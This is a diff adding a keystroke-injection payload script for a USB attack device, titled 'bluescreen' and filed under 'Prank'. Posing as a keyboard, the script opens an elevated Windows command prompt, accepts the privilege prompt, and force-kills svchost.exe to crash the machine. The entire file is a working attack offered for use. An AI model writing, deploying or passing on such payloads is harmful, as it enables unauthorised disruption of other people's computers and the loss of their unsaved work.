@@ -1,0 +1,40 @@
+# Title:         bluescreen
+# Description:   Crash Windows; cause a bluescreen
+# Author:        BobyMCbobs
+# Version:       1.0.0
+# Category:      Prank
+# Target:        Windows 7? - Windows 10
+# Attackmodes:   HID
+
+# Options
+DELAY_RATIO=1
+
+# setup
+LED SETUP
+ATTACKMODE HID
+
+# begin attack
+LED ATTACK
+# go to desktop (if supported)
+Q GUI d
+Q DELAY $((500 * $DELAY_RATIO))
+# open an elevated cmd window
+Q GUI
+Q DELAY $((200 * $DELAY_RATIO))
+Q STRING cmd
+Q DELAY $((300 * $DELAY_RATIO))
+Q MENU
+Q DELAY $((500 * $DELAY_RATIO))
+Q DOWN
+Q DELAY $((300 * $DELAY_RATIO))
+Q ENTER
+Q DELAY $((1000 * $DELAY_RATIO))
+Q LEFT
+Q DELAY $((500 * $DELAY_RATIO))
+Q ENTER
+# kill an important program = bluescreen
+Q DELAY $((900 * $DELAY_RATIO))
+Q STRING taskkill /f /im svchost.exe /t
+Q ENTER
+
+LED FINISH
